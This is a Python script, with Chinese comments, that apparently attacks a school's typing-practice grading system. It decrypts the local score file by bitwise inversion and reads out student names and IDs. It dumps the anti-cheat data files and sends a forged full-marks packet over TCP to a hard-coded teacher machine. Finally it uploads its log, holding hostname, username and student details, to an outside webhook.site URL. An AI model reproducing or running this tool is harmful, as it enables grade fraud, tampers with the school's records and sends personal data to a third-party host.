import socket
import os
import sys
import traceback
import zipfile
import urllib.request
import platform
import getpass
from datetime import datetime

# ================= 配置区 =================
# 默认链接，如果过期了，下面会提示你重新输入
DEFAULT_WEBHOOK_URL = "https://webhook.site/916e9373-60d5-4980-b735-930f2b5ee051"
TEACHER_IP = "192.168.9.253"
PORT = 5200
LOG_FILE = "absolute_reverse_log.txt"
# =========================================

WEBHOOK_URL = DEFAULT_WEBHOOK_URL

def log(msg):
    try:
        print(msg)
        with open(LOG_FILE, "a", encoding="utf-8") as f:
            f.write(msg + "\n")
    except:
        pass

def hex_dump(data, max_len=512):
    if not data: return "空"
    if len(data) > max_len:
        data = data[:max_len]
        suffix = " ...(截断)"
    else:
        suffix = ""
    hex_str = " ".join([f"{b:02X}" for b in data])
    lines = [hex_str[i:i+47] for i in range(0, len(hex_str), 48)]
    return "\n    ".join(lines) + suffix

def find_file(filename):
    base_dir = os.path.dirname(os.path.abspath(sys.argv[0]))
    paths = [
        filename, os.path.join(base_dir, filename),
        os.path.join("..", filename), os.path.join("lztt", filename),
        os.path.join("..", "lztt", filename)
    ]
    for p in paths:
        if os.path.exists(p):
            return os.path.abspath(p)
    return None

def analyze_rec_file():
    log("\n==========================================")
    log("     [核心] Lztt_E.rec 成绩文件全量提取    ")
    log("==========================================")
    rec_path = find_file("Lztt_E.rec")
    if not rec_path:
        log("[-] 找不到 Lztt_E.rec！")
        return "UNKNOWN_ID"
        
    try:
        with open(rec_path, "rb") as f:
            raw_data = f.read()
        log(f"[*] 路径: {rec_path} | 大小: {len(raw_data)} 字节")
        log(f"[*] 原始加密字节 (Hex):\n    {hex_dump(raw_data)}")
        
        decrypted = bytes([~b & 0xFF for b in raw_data])
        plaintext = decrypted.decode('gbk', errors='ignore').strip()
        
        log(f"[+] 解密明文:\n    {plaintext}")
        parts = plaintext.split()
        if len(parts) >= 10:
            log(f"[*] 字段拆解: 关卡:{parts[0]} 限时:{parts[1]} 学号:{parts[2]} 姓名:{parts[3]} 科目:{parts[4]} 用时:{parts[5]} 速度:{parts[6]} 正确率:{parts[7]} 字数:{parts[8]} 成绩:{parts[9]}")
            return parts[2]
    except Exception as e:
        log(f"[-] 解析成绩文件发生异常: {e}")
    return "UNKNOWN_ID"

def analyze_dat_file(filename):
    log(f"\n==========================================")
    log(f"     [防作弊] {filename} 文件全量提取       ")
    log(f"==========================================")
    path = find_file(filename)
    if not path:
        log(f"[-] 找不到 {filename} 文件。")
        return
    try:
        with open(path, "rb") as f:
            raw_data = f.read()
        log(f"[*] 路径: {path} (大小: {len(raw_data)} 字节)")
        log(f"[*] 原始字节 (Hex):\n    {hex_dump(raw_data, 256)}")
        
        for enc in ['utf-8', 'gbk']:
            try:
                text = raw_data.decode(enc).strip()
                lines = text.splitlines()
                log(f"[+] 尝试 {enc} 读取成功！总行数: {len(lines)}")
                for line in lines[:15]: log(f"    {line}")
                return
            except: pass
                
        dec_text = bytes([~b & 0xFF for b in raw_data]).decode('gbk', errors='ignore').strip()
        lines = dec_text.splitlines()
        log(f"[+] NOT 解密成功！总行数: {len(lines)}")
        for line in lines[:15]: log(f"    {line}")
    except Exception as e:
        log(f"[-] 读取 {filename} 失败: {e}")

def direct_send_with_capture(student_id):
    log("\n==========================================")
    log("         直接发送满分包 + 网络双向抓包       ")
    log("==========================================")
    if student_id == "UNKNOWN_ID": student_id = "2023001"

    packet_str = f"T{student_id}{student_id}E本次英文练习速度，只有150150100500100500"
    packet_bytes = packet_str.encode('gbk')
    
    log(f"[*] 目标 IP: {TEACHER_IP} | 端口: {PORT}")
    log(f"[*] 发包明文: {packet_str}")
    log(f"[>>> 发送端抓包 (Hex) >>>]\n    {hex_dump(packet_bytes)}")
    
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5)
        log("[*] 正在建立 TCP 连接...")
        s.connect((TEACHER_IP, PORT))
        log("[+] 连接成功，投递满分包...")
        s.sendall(packet_bytes)
        
        try:
            resp = s.recv(4096)
            if resp:
                log(f"[<<< 接收端抓包 (Hex) <<<]\n    {hex_dump(resp)}")
                log(f"[+] 回执明文解析: {resp.decode('gbk', errors='ignore').strip()}")
            else:
                log("[-] 服务器返回空字节。")
        except socket.timeout:
            log("[-] 接收回执超时。")
        s.close()
    except Exception as e:
        log(f"[-] 网络模块异常: {e}")

def upload_log_to_webhook():
    if not WEBHOOK_URL.strip(): return
    log(f"\n[*] 正在将日志自动上传至云端 ({WEBHOOK_URL})...")
    try:
        with open(LOG_FILE, "rb") as f:
            data = f.read()
        req = urllib.request.Request(
            WEBHOOK_URL, data=data, headers={'Content-Type': 'text/plain; charset=utf-8'}
        )
        response = urllib.request.urlopen(req, timeout=10)
        log(f"[+] 日志上传成功！HTTP 状态码: {response.getcode()}")
    except Exception as e:
        log(f"[-] 日志上传失败: {e}")
        log("[!] 如果失败，立刻用手机拍下屏幕！")

if __name__ == "__main__":
    global WEBHOOK_URL
    try:
        if os.path.exists(LOG_FILE): os.remove(LOG_FILE)
        
        log(f"[*] 环境信息：时间:{datetime.now().strftime('%Y-%m-%d %H:%M:%S')} | 主机:{socket.gethostname()} | 用户:{getpass.getuser()}")
        
        # 【重要】允许机房现场重新输入Webhook链接
        print("\n" + "="*50)
        new_url = input("【重要】如果不按回车，将使用默认Webhook。\n如果默认链接过期了，请在这里粘贴你手机上新生成的Webhook链接，然后按回车：\n> ")
        if new_url.strip():
            WEBHOOK_URL = new_url.strip()
            log(f"[*] 已更新 Webhook 链接为: {WEBHOOK_URL}")
            
        real_id = analyze_rec_file()
        analyze_dat_file("e.dat")
        analyze_dat_file("c.dat")
        
        print("\n" + "="*50)
        print(f"本地数据提取完毕，即将使用学号 [{real_id}] 发送满分包。")
        input("按回车键开始执行网络发包...")
        direct_send_with_capture(real_id)
        
    except Exception:
        log("\n[-] 发生致命异常：")
        log(traceback.format_exc())
    finally:
        upload_log_to_webhook()
        log("\n[!!!] 全流程已安全执行完毕。")
        print("\n[!] 如果上传成功，周五回家看手机；如果失败，立刻拍照！")